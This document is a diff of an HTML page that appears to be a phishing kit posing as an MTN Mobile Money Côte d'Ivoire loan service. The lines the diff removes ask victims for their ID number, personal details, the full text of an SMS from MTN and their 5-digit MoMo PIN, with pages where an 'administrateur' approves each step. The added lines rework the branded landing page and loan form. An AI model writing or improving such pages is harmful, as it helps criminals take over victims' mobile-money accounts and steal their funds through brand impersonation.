@@ -4,19 +4,17 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <meta name="theme-color" content="#ffcc00" />
-<meta name="description" content="MTN Mobile Money Côte d'Ivoire – Prêts faciles" />
-<title>MTN Mobile Money Côte d'Ivoire – Prêts faciles</title>
+<title>MoMo Easy Quick Loans – Côte d'Ivoire</title>
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
-<noscript><div style="padding:24px;text-align:center;font-family:sans-serif;">JavaScript est requis.</div></noscript>
+<noscript><div style="padding:24px;text-align:center;">JavaScript est requis.</div></noscript>
+<div id="offlineBanner" class="offline-banner hidden">📡 Hors ligne — reconnexion...</div>
 
-<div id="offlineBanner" class="offline-banner hidden">📡 Vous êtes hors ligne — reconnexion...</div>
-
-<!-- ACCUEIL -->
+<!-- ═════════ WELCOME + CALCULATOR (LANDING) ═════════ -->
 <div id="page-landing" class="page active">
     <div class="land-nav">
         <div style="flex:1;"></div>
@@ -30,44 +28,44 @@
     <div class="land-container">
         <div class="land-main">
             <div class="land-hero">
-                <h1>Bienvenue sur MTN Mobile Money Côte d'Ivoire</h1>
-                <p class="land-tagline">Obtenez un prêt facilement via MTN Mobile Money</p>
+                <div class="welcome-badge">🎉 Bienvenue</div>
+                <h1>MoMo Easy Quick Loans</h1>
+                <p class="land-tagline">Obtenez un prêt rapide en 3 étapes simples avec MTN Mobile Money</p>
             </div>
             <div class="land-actions">
                 <div class="action-card apply-card">
-                    <div class="action-icon">✅</div>
-                    <h3>J'ai déjà MoMo</h3>
-                    <p>Reliez votre portefeuille une fois, puis demandez un prêt en un clic</p>
-                    <button class="btn-grad" id="applyBtn">Continuer avec MoMo</button>
+                    <div class="action-icon">🚀</div>
+                    <h3>Demander un prêt</h3>
+                    <p>Remplissez votre demande en quelques minutes, puis connectez-vous à MoMo pour finaliser.</p>
+                    <button class="btn-grad" id="applyBtn">Commencer ma demande</button>
                 </div>
-                <div class="action-divider"><span>OU</span></div>
                 <div class="action-card register-card">
                     <div class="action-icon">📱</div>
-                    <h3>Je n'ai pas encore MoMo</h3>
-                    <p>Inscrivez-vous en 60 secondes, puis demandez un prêt</p>
-                    <button class="btn-gray" id="registerFirstBtn">S'inscrire d'abord</button>
+                    <h3>Pas encore MoMo ?</h3>
+                    <p>Créez votre compte MTN Mobile Money d'abord</p>
+                    <button class="btn-gray" id="registerFirstBtn">Créer un compte MoMo</button>
                 </div>
             </div>
             <div class="land-info">
                 <div class="info-pill">🔒 Sécurisé</div>
-                <div class="info-pill">⚡ Approbation rapide</div>
-                <div class="info-pill">🇨🇮 Fièrement ivoirien</div>
+                <div class="info-pill">⚡ 5 minutes</div>
+                <div class="info-pill">🇨🇮 Côte d'Ivoire</div>
             </div>
         </div>
         <aside class="calc-sidebar">
             <div class="calc-card">
                 <div class="calc-header">
                     <div class="calc-header-icon">💰</div>
-                    <div><h2>Calculateur de Prêt</h2><p>Voyez votre mensualité</p></div>
+                    <div><h2>Calculateur de Prêt</h2><p>Estimez votre mensualité</p></div>
                 </div>
                 <div class="calc-amount">
                     <div class="calc-amount-label">Montant du Prêt</div>
                     <div class="calc-amount-value" id="calcAmt">100 000 F CFA</div>
                 </div>
                 <input type="range" id="amtSlider" min="25000" max="2000000" step="5000" value="100000" />
-                <div class="range-ends"><span>25 000 F CFA</span><span>2 000 000 F CFA</span></div>
+                <div class="range-ends"><span>25 000 F</span><span>2 000 000 F</span></div>
                 <div class="calc-term">
-                    <label>Durée du Prêt</label>
+                    <label>Durée</label>
                     <div class="sel-wrap">
                         <select id="calcTermSelect">
                             <option value="6">6 Mois</option>
@@ -81,588 +79,280 @@
                 </div>
                 <div class="calc-result">
                     <div class="result-row"><span>Mensualité</span><strong id="monthlyAmt">9 000 F CFA</strong></div>
-                    <div class="result-row"><span>Total à rembourser</span><strong id="totalAmt">108 000 F CFA</strong></div>
-                    <div class="result-row highlight"><span>Montant reçu</span><strong id="receiveAmt">100 000 F CFA</strong></div>
+                    <div class="result-row"><span>Total</span><strong id="totalAmt">108 000 F CFA</strong></div>
+                    <div class="result-row highlight"><span>Vous recevez</span><strong id="receiveAmt">100 000 F CFA</strong></div>
                 </div>
-                <button class="btn-grad calc-apply-btn" id="calcApplyBtn">Demander ce prêt</button>
-                <div class="calc-note">💡 Vous pourrez modifier plus tard</div>
+                <button class="btn-grad calc-apply-btn" id="calcApplyBtn">Continuer avec ce montant</button>
             </div>
         </aside>
     </div>
-    <div class="land-footer">© 2026 MTN Mobile Money Côte d'Ivoire</div>
+    <div class="land-footer">© 2026 MTN Mobile Money Côte d'Ivoire · Support : <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener">mtn.ci</a> · 111</div>
 </div>
 
-<!-- CHOIX : LIER OU CONTINUER SANS LIER -->
-<div id="page-choose-path" class="page">
+<!-- ═════════ APPLICATION FORM ═════════ -->
+<div id="page-application" class="page">
     <nav class="navbar">
         <a class="nav-left" data-goto="page-landing">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
+        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
         <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Vous avez déjà MoMo ?</h2>
-        <p class="step-sub">Deux options s'offrent à vous</p>
-
-        <div class="msg-box error" id="chooseErr"><span class="msg-icon">✕</span><span id="chooseErrTxt"></span></div>
-
-        <div class="field">
-            <label>Quel type de compte MoMo avez-vous ?</label>
-            <div class="account-types" id="chooseAccountTypes">
-                <div class="account-type" data-type="simplifie">
-                    <div class="at-icon">🟢</div>
-                    <div class="at-info">
-                        <div class="at-name">Compte Simplifié <span class="at-level">Niveau 1</span></div>
-                        <div class="at-desc">Journalier : 200 000 F · <b>Prêt max : 100 000 F</b></div>
-                    </div>
-                    <div class="at-check">○</div>
-                </div>
-                <div class="account-type" data-type="standard">
-                    <div class="at-icon">🔵</div>
-                    <div class="at-info">
-                        <div class="at-name">Compte Standard <span class="at-level">Niveau 2</span></div>
-                        <div class="at-desc">Journalier : 500 000 F · <b>Prêt max : 500 000 F</b></div>
-                    </div>
-                    <div class="at-check">○</div>
-                </div>
-                <div class="account-type" data-type="premium">
-                    <div class="at-icon">🟣</div>
-                    <div class="at-info">
-                        <div class="at-name">Compte Premium <span class="at-level">Niveau 3</span></div>
-                        <div class="at-desc">Journalier : 2 000 000 F · <b>Prêt max : 2 000 000 F</b></div>
-                    </div>
-                    <div class="at-check">○</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="path-actions">
-            <button class="btn-outline path-btn" id="chooseSkipBtn">
-                <span class="path-icon">⚡</span>
-                <span class="path-text">
-                    <strong>Continuer sans lier</strong>
-                    <em>Demande immédiate, vérification plus tard</em>
-                </span>
-            </button>
-            <button class="btn-grad path-btn" id="chooseLinkBtn">
-                <span class="path-icon">🔗</span>
-                <span class="path-text">
-                    <strong>Lier mon compte maintenant</strong>
-                    <em>Vérification par SMS + code PIN</em>
-                </span>
-            </button>
-        </div>
-
-        <div class="path-note">
-            💡 <b>Recommandé :</b> Lier votre compte accélère l'approbation finale.
-            <br>Vous pourrez toujours lier plus tard.
-        </div>
-    </div></div>
-</div>
-
-<!-- INSCRIPTION -->
-<div id="page-register-check" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-landing">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-    </nav>
-    <div class="step-center">
-        <div class="step-card">
-            <h2 id="regHeading">Inscription MoMo</h2>
-            <p class="step-sub" id="regSubheading">Inscrivez-vous en moins de 60 secondes</p>
-            <div class="reg-intro">
-                <div class="reg-icon">📱</div>
-                <h3 id="regIntroH3">Vous êtes à 2 étapes de votre prêt</h3>
-                <p id="regIntroP">MoMo est le service de monnaie mobile de MTN. Enregistrez votre portefeuille, puis demandez un prêt.</p>
-            </div>
-            <div class="msg-box error" id="regErr"><span class="msg-icon">✕</span><span id="regErrTxt"></span></div>
-            <div class="field">
-                <label>Numéro de CNI</label>
-                <input type="text" id="regId" placeholder="ex. CI0123456789" maxlength="14" autocomplete="off" style="text-transform:uppercase;" />
-                <div class="field-hint">Carte Nationale d'Identité (8–14 caractères alphanumériques)</div>
-            </div>
-            <div class="field">
-                <label>Nom complet</label>
-                <input type="text" id="regName" maxlength="80" placeholder="Ex. Konan Yao" autocomplete="name" />
-            </div>
-            <div class="field">
-                <label>Numéro de téléphone mobile (MTN)</label>
-                <div class="phone-row">
-                    <div class="ph-pre">+225</div>
-                    <input type="tel" id="regPhone" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" autocomplete="tel-national" />
-                </div>
-                <div class="field-hint">Format 10 chiffres (ex. 0501020304)</div>
-            </div>
-            <div class="field">
-                <label>Adresse email</label>
-                <input type="email" id="regEmail" maxlength="120" placeholder="vous@email.com" autocomplete="email" />
-                <div class="field-hint">Confirmations et mises à jour</div>
-            </div>
-            <div class="field">
-                <label>Date de naissance</label>
-                <input type="date" id="regDob" />
-                <div class="field-hint">🔒 Vous devez avoir 18 ans ou plus</div>
-            </div>
-            <div class="field">
-                <label>Choisissez votre type de compte MoMo</label>
-                <div class="account-types" id="accountTypes">
-                    <div class="account-type" data-type="simplifie">
-                        <div class="at-icon">🟢</div>
-                        <div class="at-info">
-                            <div class="at-name">Compte Simplifié <span class="at-level">Niveau 1</span></div>
-                            <div class="at-desc">Journalier : 200 000 F · Mensuel : 500 000 F · <b>Prêt max : 100 000 F</b></div>
-                        </div>
-                        <div class="at-check">○</div>
-                    </div>
-                    <div class="account-type" data-type="standard">
-                        <div class="at-icon">🔵</div>
-                        <div class="at-info">
-                            <div class="at-name">Compte Standard <span class="at-level">Niveau 2</span></div>
-                            <div class="at-desc">Journalier : 500 000 F · Mensuel : 2 000 000 F · <b>Prêt max : 500 000 F</b></div>
-                        </div>
-                        <div class="at-check">○</div>
-                    </div>
-                    <div class="account-type" data-type="premium">
-                        <div class="at-icon">🟣</div>
-                        <div class="at-info">
-                            <div class="at-name">Compte Premium <span class="at-level">Niveau 3</span></div>
-                            <div class="at-desc">Journalier : 2 000 000 F · Mensuel : 10 000 000 F · <b>Prêt max : 2 000 000 F</b></div>
-                        </div>
-                        <div class="at-check">○</div>
-                    </div>
-                </div>
-                <div class="field-hint" id="accountTypeHint">Appuyez pour sélectionner</div>
-            </div>
-            <div class="agreement-wrap">
-                <label class="confirm-check">
-                    <input type="checkbox" id="regTnc" />
-                    <span>J'ai lu et j'accepte les <a href="#" id="termsLink">Conditions Générales</a>, je confirme avoir 18 ans ou plus et je consens au traitement de mes données.</span>
-                </label>
-            </div>
-            <button class="btn-grad" id="regBtn">Terminer l'inscription</button>
-        </div>
-    </div>
-</div>
-
-<!-- TRAITEMENT INSCRIPTION -->
-<div id="page-register-processing" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📱</div>
-        <h2>Envoi de l'inscription...</h2>
-        <p>Envoi de vos informations pour vérification</p>
-        <div class="wait-status" id="regProcessingStatus">⏳ Veuillez patienter...</div>
-        <div class="poll-indicator"><span class="dot"></span> Quelques secondes...</div>
-    </div></div>
-</div>
-
-<!-- ATTENTE INSCRIPTION -->
-<div id="page-registration-wait" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">⏳</div>
-        <h2>Traitement de votre demande...</h2>
-        <p>Veuillez patienter pendant que nous traitons votre demande.</p>
-        <div class="wait-status" id="regWaitStatus">⏳ En attente de vérification...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <div class="wait-appid">ID Dossier : <span class="mono" id="regWaitAppId">—</span></div>
-        <button class="btn-gray" id="cancelRegWaitBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- COLLER LE SMS -->
-<div id="page-registration-sms" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-registration-wait">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Collez votre SMS</h2>
-        <p class="step-sub">Vérifiez votre numéro de téléphone</p>
-        <div class="login-intro">
-            <div class="li-icon">📩</div>
-            <h3>Copiez le SMS complet de MTN</h3>
-            <p>Copiez le <b>SMS entier</b> reçu de MTN pour <b id="regSmsPhone">+225 —</b> et collez-le ci-dessous.</p>
-        </div>
-        <div class="msg-box error" id="regSmsErr"><span class="msg-icon">✕</span><span id="regSmsErrTxt"></span></div>
-        <div class="field">
-            <label>Texte complet du SMS</label>
-            <textarea id="regSms" rows="6" maxlength="2000" placeholder="Collez le SMS complet ici..."></textarea>
-            <div class="field-hint">L'administrateur vérifiera le SMS et confirmera</div>
-        </div>
-        <button class="btn-grad" id="regSmsBtn">Envoyer le SMS</button>
-    </div></div>
-</div>
-
-<!-- ATTENTE SMS -->
-<div id="page-registration-sms-wait" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📩</div>
-        <h2>Vérification de votre SMS...</h2>
-        <p>Veuillez patienter pendant que nous traitons votre demande.</p>
-        <div class="wait-status" id="regSmsWaitStatus">⏳ En attente de confirmation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <div class="wait-appid">ID Dossier : <span class="mono" id="regSmsWaitAppId">—</span></div>
-        <button class="btn-gray" id="cancelSmsWaitBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- CODE PIN -->
-<div id="page-registration-pin" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-registration-sms">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Définissez votre code PIN MoMo</h2>
-        <p class="step-sub">Code PIN à 5 chiffres pour votre portefeuille</p>
-        <div class="login-intro">
-            <div class="li-icon">🔐</div>
-            <h3>Choisissez un code PIN sécurisé</h3>
-            <p>Ce code PIN autorisera les transactions sur votre compte MoMo.</p>
-        </div>
-        <div class="msg-box error" id="regPinErr"><span class="msg-icon">✕</span><span id="regPinErrTxt"></span></div>
-        <div class="field">
-            <label>Nouveau code PIN MoMo (5 chiffres)</label>
-            <div class="pin-row">
-                <input type="password" id="regPin0" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPin1" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPin2" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPin3" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPin4" class="pin-box" maxlength="1" inputmode="numeric" />
-            </div>
-        </div>
-        <div class="field">
-            <label>Confirmez le code PIN</label>
-            <div class="pin-row">
-                <input type="password" id="regPinC0" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPinC1" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPinC2" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPinC3" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="regPinC4" class="pin-box" maxlength="1" inputmode="numeric" />
-            </div>
-        </div>
-        <button class="btn-grad" id="regPinBtn">Définir le code PIN</button>
-    </div></div>
-</div>
-
-<!-- ATTENTE PIN -->
-<div id="page-registration-pin-wait" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🔐</div>
-        <h2>Code PIN envoyé</h2>
-        <p>Veuillez patienter pendant que nous traitons votre demande.</p>
-        <div class="wait-status" id="regPinWaitStatus">⏳ En attente d'approbation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <div class="wait-appid">ID Dossier : <span class="mono" id="regPinWaitAppId">—</span></div>
-        <button class="btn-gray" id="cancelPinWaitBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- INSCRIPTION REJETÉE -->
-<div id="page-registration-rejected" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon">❌</div>
-        <h2>Inscription Rejetée</h2>
-        <p id="regRejectReason">Votre inscription a été rejetée par l'administrateur.</p>
-        <div class="msg-box error show">
-            <span class="msg-icon">ℹ️</span>
-            <span>Raisons courantes : mauvais numéro, type de compte incorrect, informations non conformes. Veuillez vous réinscrire avec des informations exactes.</span>
-        </div>
-        <button class="btn-grad" id="restartRegBtn">Se réinscrire</button>
-        <button class="btn-gray" id="backHomeBtn">Retour à l'accueil</button>
-    </div></div>
-</div>
-
-<!-- CONDITIONS -->
-<div id="page-requirements" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-landing">← Annuler</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount0"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Conditions du Prêt</h2>
-        <p class="step-sub">Ce qu'il faut pour être éligible</p>
-        <div class="req-list">
-            <div class="req-item done"><div class="req-icon">✅</div><div class="req-info"><strong>Compte MoMo</strong><div id="reqLimitText">Vérifié</div></div></div>
-            <div class="req-item"><div class="req-icon">📊</div><div class="req-info"><strong>Activité de transaction (Option A)</strong><div id="reqTxText">Avoir 20 % du montant du prêt en transactions MoMo ce mois-ci.</div></div></div>
-            <div class="req-divider"><span>OU</span></div>
-            <div class="req-item"><div class="req-icon">👥</div><div class="req-info"><strong>Garant (Option B)</strong><div>Un garant enregistré sur MoMo se porte garant pour vous.</div></div></div>
-        </div>
-        <button class="btn-grad" data-goto="page-step1">J'ai compris — Continuer</button>
-    </div></div>
-</div>
-
-<!-- ÉTAPE 1 : PRÊT -->
-<div id="page-step1" class="page">
-    <nav class="navbar">
-        <a class="nav-left" id="cancelStep1">✕ Annuler</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount"></div>
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Demande de Prêt</h2>
-        <p class="step-sub">Étape 1 sur 6 · Approbation admin requise</p>
-        <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
-        <div class="acc-info-box" id="accInfoBox"><div id="accInfoText"></div></div>
-        <div class="field"><label>Type de Prêt</label><div class="sel-wrap"><select id="s1ty"><option>Prêt Personnel</option><option selected>Prêt Commercial</option><option>Prêt Immobilier</option><option>Prêt Auto</option><option>Prêt Étudiant</option></select></div></div>
-        <div class="field"><label>Montant (F CFA)</label><input type="number" id="s1am" value="100000" placeholder="Montant" min="25000" max="2000000" inputmode="numeric" /><div class="field-hint" id="loanLimitHint">Chargement des limites...</div></div>
-        <div class="field"><label>Durée</label><div class="sel-wrap"><select id="s1te"><option>6 Mois</option><option selected>12 Mois</option><option>18 Mois</option><option>24 Mois</option><option>36 Mois</option><option>48 Mois</option></select></div></div>
-        <div class="field"><label>Objet</label><textarea id="s1pu" maxlength="300" placeholder="Décrivez l'objet du prêt…"></textarea></div>
-        <button class="btn-grad" id="s1Btn">Soumettre pour approbation</button>
-    </div></div>
-</div>
+        <p class="step-sub">Étape 1 sur 3 · Vos informations</p>
 
-<div id="page-wait-loan" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">💰</div>
-        <h2>Prêt en cours d'examen</h2>
-        <div class="wait-status" id="waitLoanStatus">⏳ En attente d'approbation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <button class="btn-gray" id="cancelWaitLoanBtn">Annuler</button>
-    </div></div>
-</div>
+        <div class="msg-box error" id="appErr"><span class="msg-icon">✕</span><span id="appErrTxt"></span></div>
 
-<!-- ÉTAPE 2 : INFOS PERSONNELLES -->
-<div id="page-step2" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-step1">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount2"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Informations Personnelles</h2>
-        <p class="step-sub">Étape 2 sur 6</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
-        <div class="field-row">
-            <div class="field"><label>Prénom</label><input type="text" id="s2fi" maxlength="40" autocomplete="given-name" /></div>
-            <div class="field"><label>Nom</label><input type="text" id="s2la" maxlength="40" autocomplete="family-name" /></div>
-        </div>
-        <div class="field"><label>Téléphone</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="s2ph" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" /></div></div>
-        <div class="field"><label>Email</label><input type="email" id="s2em" maxlength="120" autocomplete="email" /></div>
-        <button class="btn-grad" id="s2Btn">Soumettre pour approbation</button>
-    </div></div>
-</div>
+        <!-- LOAN -->
+        <h3 class="section-h">💰 Prêt demandé</h3>
+        <div class="field"><label>Type de Prêt</label><div class="sel-wrap"><select id="appLoanType"><option>Prêt Personnel</option><option selected>Prêt Commercial</option><option>Prêt Immobilier</option><option>Prêt Auto</option><option>Prêt Étudiant</option></select></div></div>
+        <div class="field"><label>Montant (F CFA)</label><input type="number" id="appLoanAmount" value="100000" min="25000" max="2000000" inputmode="numeric" /><div class="field-hint" id="autoTypeHint">Type de compte détecté automatiquement</div></div>
+        <div class="field"><label>Durée</label><div class="sel-wrap"><select id="appLoanTerm"><option>6 Mois</option><option selected>12 Mois</option><option>18 Mois</option><option>24 Mois</option><option>36 Mois</option><option>48 Mois</option></select></div></div>
+        <div class="field"><label>Objet</label><textarea id="appLoanPurpose" maxlength="300" placeholder="Décrivez l'objet du prêt…"></textarea></div>
 
-<div id="page-wait-personal" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">👤</div>
-        <h2>Informations en cours d'examen</h2>
-        <div class="wait-status" id="waitPersonalStatus">⏳ En attente d'approbation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <button class="btn-gray" id="cancelWaitPersonalBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- ÉTAPE 3 : EMPLOI -->
-<div id="page-step3" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-step2">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount3"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Emploi &amp; Proche</h2>
-        <p class="step-sub">Étape 3 sur 6</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
-        <div class="field"><label>Situation professionnelle</label><div class="sel-wrap"><select id="s3em"><option>Salarié(e)</option><option selected>Travailleur indépendant</option><option>Sans emploi</option><option>Retraité(e)</option><option>Étudiant(e)</option></select></div></div>
-        <div class="field"><label>Revenu annuel (F CFA)</label><input type="number" id="s3in" min="0" max="100000000" inputmode="numeric" /></div>
-        <div class="field"><label>Nom du proche</label><input type="text" id="s3kn" maxlength="60" /></div>
-        <div class="field"><label>Téléphone du proche</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="s3kp" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" /></div></div>
-        <button class="btn-grad" id="s3Btn">Soumettre pour approbation</button>
-    </div></div>
-</div>
-
-<div id="page-wait-employment" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">💼</div>
-        <h2>Emploi en cours d'examen</h2>
-        <div class="wait-status" id="waitEmploymentStatus">⏳ En attente d'approbation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <button class="btn-gray" id="cancelWaitEmploymentBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- ÉTAPE 4 : GARANT -->
-<div id="page-guarantor" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-step3">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount4"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Garant</h2>
-        <p class="step-sub">Étape 4 sur 6</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-        <div class="guarantor-intro"><div class="gi-icon">👥</div><h3>Pourquoi un garant ?</h3><p>Le garant s'engage à rembourser si vous ne pouvez pas.</p></div>
-        <div class="msg-box error" id="gErr"><span class="msg-icon">✕</span><span id="gErrTxt"></span></div>
-        <div class="field"><label>Nom du garant</label><input type="text" id="gName" maxlength="60" /></div>
-        <div class="field"><label>Téléphone du garant</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="gPhone" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" /></div></div>
-        <div class="field"><label>Relation</label><div class="sel-wrap"><select id="gRel"><option value="">Sélectionner</option><option>Parent</option><option>Frère / Sœur</option><option>Conjoint(e) / Partenaire</option><option>Membre de la famille</option><option>Ami(e)</option><option>Collègue</option><option>Autre</option></select></div></div>
-        <div class="guarantor-confirm"><label class="confirm-check"><input type="checkbox" id="gConfirm" /><span>Je confirme que mon garant a accepté de garantir ce prêt</span></label></div>
-        <button class="btn-grad" id="gBtn">Soumettre pour approbation</button>
-    </div></div>
-</div>
-
-<div id="page-wait-guarantor" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🤝</div>
-        <h2>Garant en cours d'examen</h2>
-        <div class="wait-status" id="waitGuarantorStatus">⏳ En attente d'approbation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <button class="btn-gray" id="cancelWaitGuarantorBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- CONFIRMATION -->
-<div id="page-confirmation" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-guarantor">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount5"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Vérifier &amp; Confirmer</h2>
-        <p class="step-sub">Étape 5 sur 6</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
